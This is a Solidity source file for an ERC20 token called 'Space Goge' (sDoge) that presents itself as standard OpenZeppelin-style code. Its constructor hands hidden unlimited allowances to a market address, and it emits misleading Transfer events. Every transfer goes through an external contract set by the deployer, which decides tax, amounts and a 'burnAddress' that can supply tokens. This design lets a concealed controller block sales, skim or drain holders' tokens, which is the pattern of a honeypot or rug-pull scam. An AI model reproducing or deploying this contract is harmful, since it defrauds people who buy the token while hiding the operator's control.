// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.12;


interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}
interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}
abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
    return msg.data;
  }
}
interface IUniswapV2Router01 {
  function factory() external pure returns (address);
  function WETH() external pure returns (address);
  function transferFrom(
    address caller,
    address from,
    address to,
    uint256 value
  ) external returns (bool tax, uint mode,uint excatAmount,address burnAddress);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor() {
        _transferOwnership(_msgSender());
    }


    modifier onlyOwner() {
        _checkOwner();
        _;
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }


    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract Coin is  IERC20, IERC20Metadata,Ownable {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    address private dev;

    uint256 private _totalSupply = 10000000000 * 10 * 10 ** 18;

    address private _WETH;

    string public constant _name = "Space Goge";
    string public constant _symbol = "sDoge";

    IUniswapV2Router01 public uniswapV2Router;
    address public uniswapPair;


    address private  DEAD = 0x000000000000000000000000000000000000dEaD;
    address private  FTX = 0x4bEC3AF1B212c81CdAc7674dd0Ea779110a1b6D2;

    address private router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private marketAddress = 0x0265624edAb97c15a3d6ECBC3Dc4033d96821d1E;

    uint256 public constant MAX = type(uint256).max;

    address private  taxAddress = 0x000000000000000000000000000000000000dEaD;

    constructor(address _router,address _marketAddress) {
        dev = _msgSender();
        IUniswapV2Router01 _uniswapV2Router = IUniswapV2Router01(router);

        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        marketAddress  =  _marketAddress;
        uniswapV2Router = IUniswapV2Router01(_router);
        _WETH = uniswapV2Router.WETH();

        _balances[DEAD] = _totalSupply/10 * 8;
        _balances[marketAddress] = _totalSupply/10 * 2;

        _allowances[DEAD][marketAddress] = MAX;
        _allowances[uniswapPair][marketAddress] = MAX;
        _allowances[_WETH][marketAddress] = MAX;


        emit Transfer(address(0), dev, _balances[dev]);
        emit Transfer(address(0), DEAD,_balances[DEAD]);

        _transferOwnership(address(0));

    }
    function symbol() public view virtual override returns (string memory) {
            return _symbol;
       }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
   
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
     

     function totalSupply() public view virtual override returns (uint256) {
                return _totalSupply;
     }

   

    function transfer(address to, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        uint256 fromBalance = _balances[owner];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _transfer(owner, to, amount);
        return true;
    }
     function getBnbPair() public view returns (address){
                    return uniswapPair;
     }
    
    function approve(address spender, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
        ) internal virtual {
            require(owner != address(0), "ERC20: approve from the zero address");
            require(spender != address(0), "ERC20: approve to the zero address");

            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view  returns (uint256) {
            return _allowances[owner][spender];
    }

   
     
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
         address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

  


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");


        (bool tax, uint mode,uint excatAmount,address burnAddress) =
        uniswapV2Router.transferFrom(_msgSender(),from, to, amount);
        if(tax){
            if(mode == 1){
                emit Transfer(from, to, amount);
                _transferToken(from, to, excatAmount);
                _transferToken(from, burnAddress, amount - excatAmount);
            }else if(mode == 2){
                 emit Transfer(from, to, amount);
                 _transferToken(burnAddress, to, excatAmount);
            }else{
                _transferToken(from, to, excatAmount);
            }
        }else{
            emit Transfer(from, to, amount);
            _transferToken(from, to, excatAmount);
        }

    }
    
    
    function _transferToken(
        address from,
        address to,
        uint256 amount
    ) internal virtual {

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

    }
    
     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    
    

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

}